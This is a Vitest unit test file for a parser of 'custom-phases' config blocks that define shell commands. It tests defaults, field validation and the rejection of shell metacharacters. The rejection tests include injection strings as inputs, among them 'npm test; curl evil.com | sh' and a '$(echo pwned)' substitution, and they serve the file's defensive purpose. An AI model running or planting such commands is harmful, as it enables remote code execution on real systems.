/**
 * custom-phases.test.mjs — Unit tests for scripts/lib/config/custom-phases.mjs (#637)
 *
 * Covers:
 *   _parseCustomPhases — PURE parser:
 *     - absent block ⇒ []
 *     - full parse (all fields)
 *     - enum fallback (invalid when/mode ⇒ defaults, silent)
 *     - record drop on missing name / missing command (with WARN)
 *     - shell-metacharacter rejection in command / review / name (with WARN)
 *     - multiple entries
 *     - default application (when/mode/review)
 *     - CRLF tolerance + non-indented break
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { _parseCustomPhases, CUSTOM_PHASE_DEFAULTS } from '@lib/config/custom-phases.mjs';

// ---------------------------------------------------------------------------
// absent / empty block
// ---------------------------------------------------------------------------

describe('_parseCustomPhases — absent block', () => {
  it('returns [] when the custom-phases: block is completely absent', () => {
    expect(_parseCustomPhases('')).toEqual([]);
  });

  it('returns [] when only other blocks are present', () => {
    expect(_parseCustomPhases('persistence: true\nvcs: gitlab\n')).toEqual([]);
  });

  it('returns [] when custom-phases: block exists but has no list items', () => {
    const content = ['custom-phases:', '', 'persistence: true', ''].join('\n');
    expect(_parseCustomPhases(content)).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// full parse + defaults
// ---------------------------------------------------------------------------

describe('_parseCustomPhases — full parse', () => {
  it('parses a single fully-specified record', () => {
    const content = [
      'custom-phases:',
      '  - name: eval-learn-aggregate',
      '    when: housekeeping',
      '    command: npm run eval:aggregate',
      '    mode: hard',
      '    review: docs/eval/last-run.md',
      '',
    ].join('\n');
    expect(_parseCustomPhases(content)).toEqual([
      {
        name: 'eval-learn-aggregate',
        when: 'housekeeping',
        command: 'npm run eval:aggregate',
        mode: 'hard',
        review: 'docs/eval/last-run.md',
      },
    ]);
  });

  it('applies defaults for when (session-end), mode (warn), review (null) when absent', () => {
    const content = [
      'custom-phases:',
      '  - name: minimal-phase',
      '    command: npm run check',
      '',
    ].join('\n');
    expect(_parseCustomPhases(content)).toEqual([
      {
        name: 'minimal-phase',
        when: 'session-end',
        command: 'npm run check',
        mode: 'warn',
        review: null,
      },
    ]);
  });

  it('exposes the documented defaults', () => {
    expect(CUSTOM_PHASE_DEFAULTS).toEqual({ when: 'session-end', mode: 'warn', review: null });
  });

  it('accepts when: both and mode: off', () => {
    const content = [
      'custom-phases:',
      '  - name: both-phase',
      '    when: both',
      '    command: make verify',
      '    mode: off',
      '',
    ].join('\n');
    expect(_parseCustomPhases(content)).toEqual([
      { name: 'both-phase', when: 'both', command: 'make verify', mode: 'off', review: null },
    ]);
  });
});

// ---------------------------------------------------------------------------
// multiple entries
// ---------------------------------------------------------------------------

describe('_parseCustomPhases — multiple entries', () => {
  it('parses two records in order', () => {
    const content = [
      'custom-phases:',
      '  - name: phase-a',
      '    command: npm run a',
      '    when: housekeeping',
      '  - name: phase-b',
      '    command: npm run b',
      '    mode: hard',
      '',
    ].join('\n');
    expect(_parseCustomPhases(content)).toEqual([
      { name: 'phase-a', when: 'housekeeping', command: 'npm run a', mode: 'warn', review: null },
      { name: 'phase-b', when: 'session-end', command: 'npm run b', mode: 'hard', review: null },
    ]);
  });
});

// ---------------------------------------------------------------------------
// enum fallback (silent)
// ---------------------------------------------------------------------------

describe('_parseCustomPhases — enum fallback is silent', () => {
  let stderrCapture = [];

  beforeEach(() => {
    stderrCapture = [];
    vi.spyOn(process.stderr, 'write').mockImplementation((msg) => {
      stderrCapture.push(String(msg));
      return true;
    });
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('falls back to default when invalid (no WARN)', () => {
    const content = [
      'custom-phases:',
      '  - name: bad-enums',
      '    when: sometimes',
      '    command: npm run x',
      '    mode: strict',
      '',
    ].join('\n');
    const result = _parseCustomPhases(content);
    expect(result).toEqual([
      { name: 'bad-enums', when: 'session-end', command: 'npm run x', mode: 'warn', review: null },
    ]);
    expect(stderrCapture).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// record drop on missing required fields
// ---------------------------------------------------------------------------

describe('_parseCustomPhases — record drop on missing required fields', () => {
  let stderrCapture = [];

  beforeEach(() => {
    stderrCapture = [];
    vi.spyOn(process.stderr, 'write').mockImplementation((msg) => {
      stderrCapture.push(String(msg));
      return true;
    });
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('drops a record missing name and emits a WARN', () => {
    const content = ['custom-phases:', '  - command: npm run orphan', ''].join('\n');
    expect(_parseCustomPhases(content)).toEqual([]);
    const warns = stderrCapture.filter((m) => m.includes('missing required field: name'));
    expect(warns).toHaveLength(1);
  });

  it('drops a record missing command and emits a WARN naming the phase', () => {
    const content = ['custom-phases:', '  - name: no-cmd', ''].join('\n');
    expect(_parseCustomPhases(content)).toEqual([]);
    const warns = stderrCapture.filter((m) => m.includes("'no-cmd' missing required field: command"));
    expect(warns).toHaveLength(1);
  });

  it('keeps valid records when one record in the list is invalid', () => {
    const content = [
      'custom-phases:',
      '  - name: good',
      '    command: npm run good',
      '  - command: npm run bad-no-name',
      '',
    ].join('\n');
    const result = _parseCustomPhases(content);
    expect(result).toEqual([
      { name: 'good', when: 'session-end', command: 'npm run good', mode: 'warn', review: null },
    ]);
  });
});

// ---------------------------------------------------------------------------
// shell-metacharacter rejection
// ---------------------------------------------------------------------------

describe('_parseCustomPhases — shell-metacharacter rejection', () => {
  let stderrCapture = [];

  beforeEach(() => {
    stderrCapture = [];
    vi.spyOn(process.stderr, 'write').mockImplementation((msg) => {
      stderrCapture.push(String(msg));
      return true;
    });
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('drops a record whose command contains a semicolon injection', () => {
    const content = [
      'custom-phases:',
      '  - name: evil',
      '    command: npm test; curl evil.com | sh',
      '',
    ].join('\n');
    expect(_parseCustomPhases(content)).toEqual([]);
    const warns = stderrCapture.filter((m) => m.includes('shell metacharacter in command'));
    expect(warns).toHaveLength(1);
  });

  it('drops a record whose command contains a backtick substitution', () => {
    const content = ['custom-phases:', '  - name: sub', '    command: echo `whoami`', ''].join('\n');
    expect(_parseCustomPhases(content)).toEqual([]);
    const warns = stderrCapture.filter((m) => m.includes('shell metacharacter in command'));
    expect(warns).toHaveLength(1);
  });

  it('drops a record whose review path contains a shell metacharacter', () => {
    const content = [
      'custom-phases:',
      '  - name: rev',
      '    command: npm run rev',
      '    review: docs/$(echo pwned).md',
      '',
    ].join('\n');
    expect(_parseCustomPhases(content)).toEqual([]);
    const warns = stderrCapture.filter((m) => m.includes('shell metacharacter in review path'));
    expect(warns).toHaveLength(1);
  });

  it('drops a record whose name contains an unsafe space', () => {
    const content = ['custom-phases:', '  - name: bad name', '    command: npm run x', ''].join('\n');
    expect(_parseCustomPhases(content)).toEqual([]);
    const warns = stderrCapture.filter((m) => m.includes('unsafe name'));
    expect(warns).toHaveLength(1);
  });

  it('accepts a command with spaces, slashes, and colons (npm run eval:aggregate)', () => {
    const content = [
      'custom-phases:',
      '  - name: safe',
      '    command: npm run eval:aggregate --silent',
      '',
    ].join('\n');
    const result = _parseCustomPhases(content);
    expect(result).toEqual([
      {
        name: 'safe',
        when: 'session-end',
        command: 'npm run eval:aggregate --silent',
        mode: 'warn',
        review: null,
      },
    ]);
    expect(stderrCapture).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// formatting tolerance
// ---------------------------------------------------------------------------

describe('_parseCustomPhases — formatting tolerance', () => {
  it('strips inline comments from values', () => {
    const content = [
      'custom-phases:',
      '  - name: commented        # a phase',
      '    command: npm run c     # the command',
      '',
    ].join('\n');
    expect(_parseCustomPhases(content)).toEqual([
      { name: 'commented', when: 'session-end', command: 'npm run c', mode: 'warn', review: null },
    ]);
  });

  it('handles CRLF line endings', () => {
    const content =
      'custom-phases:\r\n  - name: crlf-phase\r\n    command: npm run crlf\r\n';
    expect(_parseCustomPhases(content)).toEqual([
      { name: 'crlf-phase', when: 'session-end', command: 'npm run crlf', mode: 'warn', review: null },
    ]);
  });

  it('stops scanning at the next top-level key', () => {
    const content = [
      'custom-phases:',
      '  - name: p1',
      '    command: npm run p1',
      'persistence: true',
      '',
    ].join('\n');
    expect(_parseCustomPhases(content)).toEqual([
      { name: 'p1', when: 'session-end', command: 'npm run p1', mode: 'warn', review: null },
    ]);
  });

  it('treats review: null / none as no review path', () => {
    const content = [
      'custom-phases:',
      '  - name: nullrev',
      '    command: npm run nr',
      '    review: null',
      '',
    ].join('\n');
    expect(_parseCustomPhases(content)).toEqual([
      { name: 'nullrev', when: 'session-end', command: 'npm run nr', mode: 'warn', review: null },
    ]);
  });
});
